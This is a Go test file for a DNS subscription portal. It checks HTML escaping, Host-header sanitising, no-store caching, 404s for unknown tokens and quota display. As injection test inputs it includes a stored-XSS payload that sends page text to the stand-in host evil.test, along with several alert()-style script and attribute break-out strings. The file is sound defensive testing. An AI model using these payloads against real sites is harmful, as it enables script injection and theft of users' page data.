package web

import (
	"encoding/json"
	"html/template"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"digitdns/internal/service"
)

func TestSafeHostDisplay(t *testing.T) {
	cases := map[string]string{
		"95.179.140.241":     "95.179.140.241",
		"dns.example.com":    "dns.example.com",
		"[2606:4700::1]":     "[2606:4700::1]",
		"dns.example.com:53": "dns.example.com:53",

		// The characters that matter: Go's Host header validation passes ' ( ) ,
		// through untouched. They no longer land in a JS string — the portal's
		// onclick attributes are gone and the value goes into a data-copy attribute
		// and page text now, both of which html/template escapes correctly on its
		// own. This filter stays as defence in depth: it is the only thing standing
		// between an attacker-chosen Host header and a value the subscriber is
		// invited to copy, and every context it feeds is one refactor away from
		// being a different context.
		"x'),alert(1),('":           "xalert1",
		"a',alert(document.domain)": "aalertdocument.domain",
		"<script>alert(1)</script>": "scriptalert1script",
		`x" onload="alert(1)`:       "xonloadalert1",

		// Nothing usable left means the caller's 127.0.0.1 default applies.
		"'''": "",
		"":    "",
	}
	for in, want := range cases {
		if got := safeHostDisplay(in); got != want {
			t.Errorf("safeHostDisplay(%q) = %q, want %q", in, got, want)
		}
	}

	// A long Host must not become an unbounded write into every page.
	if got := safeHostDisplay(strings.Repeat("a", 500)); len(got) != 253 {
		t.Errorf("safeHostDisplay truncated to %d bytes, want 253", len(got))
	}
}

// TestPortalEscapesClientName covers stored XSS: the name is free text an
// operator or any API-key holder sets, and the portal page it lands on also
// carries the subscriber's own token.
func TestPortalEscapesClientName(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	const payload = `<script>fetch('//evil.test/'+document.body.innerText)</script>`
	client, err := ws.clients.CreateClient(payload, 30, "10.0.0.7")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.RemoteAddr = "198.51.100.60:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	body := w.Body.String()
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	if strings.Contains(body, "<script>fetch(") {
		t.Error("the client name was written to the page as live markup")
	}
	if !strings.Contains(body, "&lt;script&gt;") {
		t.Error("the escaped name is missing; the page did not render it at all")
	}
}

func TestPortalOmitsPoliciesCard(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Policy Holder", 30, "10.0.0.8")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}
	// A client with custom policies used to render them in a "Games and services"
	// card. That card is gone from the portal; the policies still apply server-side.
	policies := []string{"enable_riot", "enable_steam"}
	if _, err := ws.clients.UpdateClient(client.ID, service.UpdateClientRequest{CustomPolicies: &policies}); err != nil {
		t.Fatalf("UpdateClient: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.RemoteAddr = "198.51.100.61:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("portal page = %d, want 200", w.Code)
	}
	body := w.Body.String()
	for _, gone := range []string{
		"Games and services enabled on this subscription",
		"Full Inherit",
		"RIOT",
		"STEAM",
	} {
		if strings.Contains(body, gone) {
			t.Errorf("the portal still renders %q — the policies box was meant to be removed", gone)
		}
	}
}


func TestPortalFiltersHostHeader(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Host Victim", 30, "10.0.0.9")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.Host = "x'),alert(document.domain),('"
	req.RemoteAddr = "198.51.100.62:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	body := w.Body.String()
	for _, frag := range []string{"alert(document.domain)", "'),", ",('"} {
		if strings.Contains(body, frag) {
			t.Errorf("the Host header reached the page with %q intact", frag)
		}
	}
}

// TestPortalDoesNotExpandPlaceholdersInValues pins the single-pass render: a
// value that itself looks like a placeholder must be emitted literally, not
// substituted on a later pass. With the old map-plus-ReplaceAll loop whether it
// expanded depended on Go's random map iteration order.
func TestPortalDoesNotExpandPlaceholdersInValues(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("{{CLIENT_TOKEN}}", 30, "10.0.0.10")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.RemoteAddr = "198.51.100.63:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	if !strings.Contains(w.Body.String(), "{{CLIENT_TOKEN}}") {
		t.Error("a placeholder-shaped name was expanded instead of printed literally")
	}
}

// TestPortalRejectsUnknownToken keeps the failure branch covered: it must not
// leak an account and must still be a well-formed page.
func TestPortalRejectsUnknownToken(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	req := httptest.NewRequest(http.MethodGet, "/sub/not-a-real-token", nil)
	req.RemoteAddr = "198.51.100.64:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "This subscription link is not valid") {
		t.Error("an unknown token did not render the invalid-subscription page")
	}
	if strings.Contains(body, "CLIENT_TOKEN") {
		t.Error("the error page leaked a template placeholder")
	}
}

// TestPortalTemplatesExecute is the canary for html/template's escape analysis.
//
// template.Must catches *parse* errors when the package loads, but a bad
// injection context — an action where the escaper cannot be chosen, say inside a
// tag name or an unquoted attribute that turns out to be a URL — is only
// reported by the first Execute. Without this test that first Execute is a
// subscriber loading their own page, and the failure is a 500 nobody sees until
// they complain.
//
// Both palettes are executed: the light one is where a different set of CSS values
// lands in a context the dark one happens not to reach.
func TestPortalTemplatesExecute(t *testing.T) {
	base := portalData{
		Lang:             "en",
		Dir:              "ltr",
		T:                portalEn,
		StatusLine:       "Subscription overview",
		ErrTitle:         "This subscription link is not valid",
		ErrNote:          "Invalid or unknown subscription token.",
		ClientIP:         "198.51.100.7",
		ServerDNS:        "dns.example.com",
		Name:             "Gamer One",
		ID:               "cl_abc123",
		UUID:             "8f14e45f-ceea-467a-9e3d-1b2c3d4e5f60",
		Token:            "tok_9f8e7d6c5b4a",
		TrafficDisplay:   "12.50 GB / 50.0 GB",
		TrafficRemaining: "37.50 GB remaining",
		TrafficPercent:   "25.0",
		ExpiresAt:        "2026-12-31 23:59:59",
		Days:             120,
		Hours:            7,
		Mins:             42,

		QuotaExceeded: true,
		HasCycle:      true,
		CycleLabel:    "monthly",
		NextResetAt:   "2026-10-01 00:00:00",
	}

	for _, theme := range []string{portalThemeDark, portalThemeLight} {
		data := base
		data.Theme = theme
		data.IsLight = theme == portalThemeLight

		for _, tpl := range []*template.Template{portalErrorTpl, portalPageTpl} {
			var out strings.Builder
			if err := tpl.Execute(&out, data); err != nil {
				t.Fatalf("%s failed to execute for %s: %v", tpl.Name(), theme, err)
			}
			body := out.String()
			// ZgotmplZ is what html/template substitutes when a value cannot be made
			// safe for the context it landed in. It renders as visible garbage, so it
			// is a bug even though it is not an error.
			if strings.Contains(body, "ZgotmplZ") {
				t.Errorf("%s emitted ZgotmplZ for %s: a value was rejected by its context filter",
					tpl.Name(), theme)
			}
			if !strings.HasSuffix(strings.TrimSpace(body), "</html>") {
				t.Errorf("%s did not render a complete document for %s", tpl.Name(), theme)
			}
			// The presentation has to actually reach the document, or the theme is
			// rendering a page nobody can see.
			if want := `<html lang="en" dir="ltr" data-theme="` + theme + `">`; !strings.Contains(body, want) {
				t.Errorf("%s (%s) does not carry %s", tpl.Name(), theme, want)
			}
		}
	}
}

// TestPortalBarIsACSSLengthNotAFilterFailure pins the one action that lands in a
// CSS context: style="width: {{.TrafficPercent}}%". A percentage formatted any
// other way — with a '%' already in it, or as a bare float via %v — is rejected
// by cssValueFilter and the bar renders at zero width for everyone.
func TestPortalBarIsACSSLengthNotAFilterFailure(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Quota Holder", 30, "10.0.0.11")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}
	limit := 50.0
	if _, err := ws.clients.UpdateClient(client.ID, service.UpdateClientRequest{TrafficLimitGB: &limit}); err != nil {
		t.Fatalf("UpdateClient: %v", err)
	}
	ws.clients.AddTraffic(client.ID, 25*(1<<30)) // half the quota, unflushed

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.RemoteAddr = "198.51.100.65:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "width: 50.0%") {
		t.Error("the quota bar is not a usable CSS width")
	}
	if !strings.Contains(body, "25.00 GB / 50.0 GB") {
		t.Error("the page does not show usage that has not been flushed yet")
	}
}

// TestPortalClampsOverQuotaBar covers the subscriber who has spent more than
// their allowance: the bar is a CSS width, so an uncapped percentage pushes the
// fill past its track, and a negative remainder reads as a credit.
func TestPortalClampsOverQuotaBar(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Over Quota", 30, "10.0.0.12")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}
	limit := 1.0
	if _, err := ws.clients.UpdateClient(client.ID, service.UpdateClientRequest{TrafficLimitGB: &limit}); err != nil {
		t.Fatalf("UpdateClient: %v", err)
	}
	ws.clients.AddTraffic(client.ID, 3*(1<<30))
	if err := ws.clients.FlushTraffic(); err != nil {
		t.Fatalf("FlushTraffic: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.RemoteAddr = "198.51.100.66:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "width: 100.0%") {
		t.Error("an over-quota subscriber pushed the traffic bar past 100%")
	}
	if !strings.Contains(body, "0.00 GB remaining") {
		t.Error("the remaining figure went negative instead of bottoming out at zero")
	}
}

// TestSubDataAPIReportsLiveTraffic pins the JSON the page's sync button reads.
// Quota enforcement compares against persisted-plus-pending, so a portal that
// reported only the persisted figure told a subscriber they had quota left while
// the proxy was already refusing them.
func TestSubDataAPIReportsLiveTraffic(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Sync Reader", 30, "10.0.0.13")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}
	const pending = 7 * (1 << 30)
	ws.clients.AddTraffic(client.ID, pending) // deliberately not flushed

	req := httptest.NewRequest(http.MethodGet, "/api/sub/"+client.Token+"/sync", nil)
	req.RemoteAddr = "198.51.100.67:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 — %s", w.Code, w.Body.String())
	}
	var body struct {
		TrafficUsedBytes uint64 `json:"traffic_used_bytes"`
		Client           struct {
			TrafficUsedBytes uint64 `json:"traffic_used_bytes"`
		} `json:"client"`
	}
	if err := json.NewDecoder(w.Body).Decode(&body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if body.TrafficUsedBytes != pending {
		t.Errorf("traffic_used_bytes = %d, want %d", body.TrafficUsedBytes, uint64(pending))
	}
	// The two figures in one response must not disagree, or the dashboard and the
	// page each pick a different one and neither reading can be trusted.
	if body.Client.TrafficUsedBytes != body.TrafficUsedBytes {
		t.Errorf("client.traffic_used_bytes = %d but traffic_used_bytes = %d",
			body.Client.TrafficUsedBytes, body.TrafficUsedBytes)
	}
}

// TestPortalShowsTheRenewalAndTheCutOff covers what a subscriber on a recurring
// plan is owed by the page: the date their volume comes back, and an unmistakable
// statement when it has run out.
//
// Both figures used to be the page's own to work out, which meant a copy of the
// quota rule and of the clamped-month arithmetic living in JavaScript. The failure
// that copy produces is silent and one-sided: the panel and the portal go on
// promising quota while the resolver has already stopped answering.
func TestPortalShowsTheRenewalAndTheCutOff(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.ProvisionClient(service.CreateClientRequest{
		Name: "Monthly Plan",
		Days: 30,
		IP:   "10.0.0.21",

		TrafficLimitGB:    1,
		TrafficResetCycle: service.TrafficCycleMonthly,
	})
	if err != nil {
		t.Fatalf("ProvisionClient: %v", err)
	}

	page := func() string {
		req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
		req.RemoteAddr = "198.51.100.71:12345"
		w := httptest.NewRecorder()
		ws.buildAdminHandler().ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200", w.Code)
		}
		return w.Body.String()
	}

	body := page()
	if !strings.Contains(body, "Quota resets automatically (monthly)") {
		t.Error("a monthly plan does not tell the subscriber their volume renews")
	}
	// Hidden rather than absent: js/portal.js reveals it after a sync, and it cannot
	// reveal an element the first paint left out.
	if !strings.Contains(body, `class="pill pill-bad is-gone" id="quota-pill"`) {
		t.Error("the cut-off pill is not rendered hidden for a subscriber who still has quota")
	}

	// Spent, and deliberately not flushed: enforcement compares against
	// persisted-plus-pending, so this is exactly the window in which the page used to
	// disagree with the resolver.
	ws.clients.AddTraffic(client.ID, 2*(1<<30))

	if body = page(); !strings.Contains(body, `class="pill pill-bad" id="quota-pill"`) {
		t.Error("a subscriber whose volume is spent is not told so on the page")
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sub/"+client.Token+"/sync", nil)
	req.RemoteAddr = "198.51.100.72:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	var payload struct {
		NextTrafficReset *time.Time `json:"next_traffic_reset"`
		QuotaExceeded    bool       `json:"quota_exceeded"`
	}
	if err := json.NewDecoder(w.Body).Decode(&payload); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if !payload.QuotaExceeded {
		t.Error("quota_exceeded is false for a subscriber who has spent twice their limit")
	}
	if payload.NextTrafficReset == nil {
		t.Fatal("next_traffic_reset is absent for a monthly plan")
	}
	if !payload.NextTrafficReset.After(time.Now()) {
		t.Errorf("next_traffic_reset = %s, which is not in the future", payload.NextTrafficReset)
	}
}

// TestPortalResponsesAreNotStored covers the caching half of "this URL is the
// credential".
//
// A response with no Cache-Control may be stored on a cache's own heuristics, and
// what these two routes return is one subscriber's IP, UUID, token and quota. The
// portal is the sharp case rather than the theoretical one: it is served over plain
// http on a VPS address to phones on networks where a transparent proxy in the path
// is ordinary, so a stored copy is an account page handed to whoever asks for that
// URL next.
func TestPortalResponsesAreNotStored(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Cache Subject", 30, "10.0.0.14")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}

	for _, path := range []string{
		"/ip/" + client.Token,
		"/sub/" + client.Token,
		"/api/sub/" + client.Token + "/sync",
		"/ip/not-a-real-token", // the failure page names a token too
	} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		req.RemoteAddr = "198.51.100.68:12345"
		w := httptest.NewRecorder()
		ws.buildAdminHandler().ServeHTTP(w, req)

		if got := w.Header().Get("Cache-Control"); got != "no-store" {
			t.Errorf("%s: Cache-Control = %q, want no-store", path, got)
		}
		if got := w.Header().Get("X-Robots-Tag"); got != "noindex, nofollow" {
			t.Errorf("%s: X-Robots-Tag = %q, want noindex, nofollow", path, got)
		}
	}
}

// TestPortalAssetsStayRevalidatable is the other side of the same middleware. The
// portal's whole reason for having its own stylesheet and script is that they are
// fetched once and then revalidated into 304s; a blanket no-store would re-send both
// on every page load and quietly undo that. Asserted through BuildHandler, because
// the override only exists in the full chain.
func TestPortalAssetsStayRevalidatable(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	for _, path := range []string{"/css/portal.css", "/js/portal.js"} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		w := httptest.NewRecorder()
		ws.buildAdminHandler().ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("%s: status = %d, want 200 — the asset is not being served", path, w.Code)
		}
		if got := w.Header().Get("Cache-Control"); got != "no-cache" {
			t.Errorf("%s: Cache-Control = %q, want no-cache", path, got)
		}
		etag := w.Header().Get("ETag")
		if etag == "" {
			t.Fatalf("%s: no ETag, so no-cache means a full re-download every visit", path)
		}

		// The revalidation itself: the same request carrying the tag must come back
		// empty, or "cacheable" is only true on paper.
		req = httptest.NewRequest(http.MethodGet, path, nil)
		req.Header.Set("If-None-Match", etag)
		w = httptest.NewRecorder()
		ws.buildAdminHandler().ServeHTTP(w, req)

		if w.Code != http.StatusNotModified {
			t.Errorf("%s: revalidation returned %d, want 304", path, w.Code)
		}
		if w.Body.Len() != 0 {
			t.Errorf("%s: 304 carried %d bytes of body", path, w.Body.Len())
		}
	}
}

// TestPortalUnknownTokenAnswers404: the T3MP3ST external-attacker pass flagged
// the friendly error page carrying 200 for a token that does not exist —
// "resource exists" to every prober, prefetcher and cache. The body stays the
// friendly card; the status tells the truth now.
func TestPortalUnknownTokenAnswers404(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	w := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/sub/ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", nil)
	ws.buildAdminHandler().ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("unknown token = %d, want 404", w.Code)
	}
	if body := w.Body.String(); !strings.Contains(body, "noindex") {
		t.Error("the friendly error body did not render alongside the 404")
	}
}

// TestPortalListsRegisteredAddresses pins the v3.1.0 IP-status card: the stored
// allowed-address list is shown to the subscriber verbatim — an operator's CIDR
// entry renders as the range, never expanded into its members — and the card
// carries the custom-address field the register card posts from. Both are display
// only; the write still runs through the secret-gated POST.
func TestPortalListsRegisteredAddresses(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("Multi Address", 30, "203.0.113.10")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}
	if _, err := ws.clients.SetClientAllowedIPs(client.ID, []string{"203.0.113.10", "198.51.100.0/24"}); err != nil {
		t.Fatalf("SetClientAllowedIPs: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/sub/"+client.Token, nil)
	req.RemoteAddr = "198.51.100.64:12345"
	w := httptest.NewRecorder()
	ws.buildAdminHandler().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	body := w.Body.String()

	if !strings.Contains(body, `id="registered-ips"`) {
		t.Fatal("the IP-status card has no registered-address list")
	}
	if !strings.Contains(body, "203.0.113.10") || !strings.Contains(body, "198.51.100.0/24") {
		t.Error("the stored allowed addresses did not reach the page")
	}
	// A /24 has 256 members; the page must show the range as entered rather than
	// spelling them out, so the literal member addresses must be absent.
	if strings.Contains(body, "198.51.100.1<") {
		t.Error("the page expanded the CIDR into its member addresses")
	}
	if !strings.Contains(body, `id="register-ip"`) {
		t.Error("the register card has no custom-address field")
	}
}

// The Android subscriber app reads the same JSON as the portal's sync button. These
// fields are display data the app cannot derive without duplicating server logic.
func TestSubDataAPICarriesAppDisplayFields(t *testing.T) {
	ws, _, cleanup := setupTestWebServer(t)
	defer cleanup()

	client, err := ws.clients.CreateClient("App Reader", 30, "10.0.0.13")
	if err != nil {
		t.Fatalf("CreateClient: %v", err)
	}

	decode := func(remote string) map[string]any {
		t.Helper()
		req := httptest.NewRequest(http.MethodGet, "/api/sub/"+client.Token, nil)
		req.RemoteAddr = remote
		w := httptest.NewRecorder()
		ws.buildAdminHandler().ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200 — %s", w.Code, w.Body.String())
		}
		var body map[string]any
		if err := json.NewDecoder(w.Body).Decode(&body); err != nil {
			t.Fatalf("decode: %v", err)
		}
		return body
	}

	body := decode("10.0.0.13:1234")
	if got := body["doh_port"]; got != float64(8443) {
		t.Errorf("doh_port = %v, want 8443", got)
	}
	if got := body["dot_port"]; got != float64(853) {
		t.Errorf("dot_port = %v, want 853", got)
	}
	if got := body["detected_ip_registered"]; got != true {
		t.Errorf("detected_ip_registered = %v, want true for a bound address", got)
	}
	if got := body["status"]; got != "active" {
		t.Errorf("status = %v, want active", got)
	}

	other := decode("198.51.100.9:1234")
	if got := other["detected_ip_registered"]; got != false {
		t.Errorf("detected_ip_registered = %v, want false for an unbound address", got)
	}
}
